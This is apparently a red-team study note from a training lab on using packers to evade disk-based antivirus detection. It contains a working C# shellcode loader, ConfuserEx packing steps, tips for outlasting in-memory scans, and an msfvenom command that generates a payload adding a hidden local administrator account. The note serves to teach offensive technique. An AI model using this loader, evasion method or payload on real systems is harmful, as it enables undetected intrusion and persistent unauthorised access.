---
{"dg-publish":true,"permalink":"/cards/red-team/packers-against-disk-based-av-detection/","tags":["red-team"]}
---

~ [[cards/red-team/Evading Antivirus - Shellcode\|Evading Antivirus - Shellcode]]
### Introduction
---
This is one of the another way to defeat disk-based AV detection: It is a software that takes a program as input and transform it so the structure looks different while maintaining its function.

Why packers even exists?
- Compress the program so that it takes up less space.
- Protect the program from reverse engineering in general.
#### Key Topics
---
- [[#Packers in Action|Understand how packers transform code and embed an unpacking stub to evade disk-based AV detection.]]
    
- [[#Packing C with ConfuserEx|Learn how to obfuscate and compress your C# payload using ConfuserEx to reduce AV detection.]]

## Packers in Action
---
The packing function is responsible for transforming or obfuscating the original code that can be **reasonably** reversed by an **unpacking** function -- while sometimes packers may add some code (to make debugging the application harder as an example), it should able to get back the original code you wrote when executing it.

![Evading Antivirus - Shellcode.png](/img/user/cards/red-team/images/Evading%20Antivirus%20-%20Shellcode.png)

To unpack the original code, the packer embed a code stub (small piece of code) that contains an unpacker and redirect the main entry point of the executable to it.

![Evading Antivirus - Shellcode-1.png|500](/img/user/cards/red-team/images/Evading%20Antivirus%20-%20Shellcode-1.png)

- Though for example our malicious reverse shell is packed -- AV detection could still flag this if the **unpacker's code** has a known signature.
- If the Antivirus solution you are trying to bypass can do in-memory scans, it might still be detected afer your code is unpacked.
#### Packing C# with ConfuserEx
---
The code:

```C#
using System;
using System.Net;
using System.Text;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;

public class Program {
  [DllImport("kernel32")]
  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

  [DllImport("kernel32")]
  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

  [DllImport("kernel32")]
  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

  private static UInt32 MEM_COMMIT = 0x1000;
  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

  public static void Main()
  {
    byte[] shellcode = new byte[] { !!REPLACE_MEEEEE!!! };


    UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);

    IntPtr threadHandle = IntPtr.Zero;
    UInt32 threadId = 0;
    IntPtr parameter = IntPtr.Zero;
    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);

    WaitForSingleObject(threadHandle, 0xFFFFFFFF);

  }
}
```

The generated shellcode:

![Evading Antivirus - Shellcode-2.png|400](/img/user/cards/red-team/images/Evading%20Antivirus%20-%20Shellcode-2.png)

```C
csc UnEncStagelessPayload.cs
```

Uploading the following:

![Evading Antivirus - Shellcode-3.png|450](/img/user/cards/red-team/images/Evading%20Antivirus%20-%20Shellcode-3.png)

With ConfuserEx:

![Evading Antivirus - Shellcode-4.png|450](/img/user/cards/red-team/images/Evading%20Antivirus%20-%20Shellcode-4.png)

1. Move to **settings** and then select your payload (the `.exe`) file.
2. Click the **'+'** button to add settings (will show true)
3. Then for packer (same window) choose compressor
4. Edit the **'true'** rule by clicking the pencil icon:

![Evading Antivirus - Shellcode-5.png|450](/img/user/cards/red-team/images/Evading%20Antivirus%20-%20Shellcode-5.png)

Finally, go to **Protect** tab and hit **'Protect!'** then upload the following to the Antivirus:

![Evading Antivirus - Shellcode-6.png|450](/img/user/cards/red-team/images/Evading%20Antivirus%20-%20Shellcode-6.png)

Things to know and try against AV in memory scanning:

- **Just wait a bit** after 5 minutes since in-memory scanning is very resource expensive most AV will scan for a while after your process starts but will eventually stop.
	- Spawn a shell then wait for 5 minutes.
	- Do absolutely nothing (malicious) for 5 minutes then spawn a shell.
	- **Much better** is combine both delay the executon of the malicious payload then wait before doing anything suspicious over the reverse shell.
- **User smaller payloads** instead of using a **large, full-featured payload** (like a reverse shell or Meterpreter session), you can use a **very small payload** that executes **just one command**, why?
	- AV engines are more likely to detect large, complex payloads or at least flags it.
	- Small payloads that just **run a single command** are simpler, and often **don’t contain obvious shellcode patterns**.
	- Basically less code = fewer suspicious indicators = less likely to trigger AV.

```C
msfvenom -a x64 -p windows/x64/exec CMD='net user pwnd Password321 /add;net localgroup administrators pwnd /add' -f csharp
```





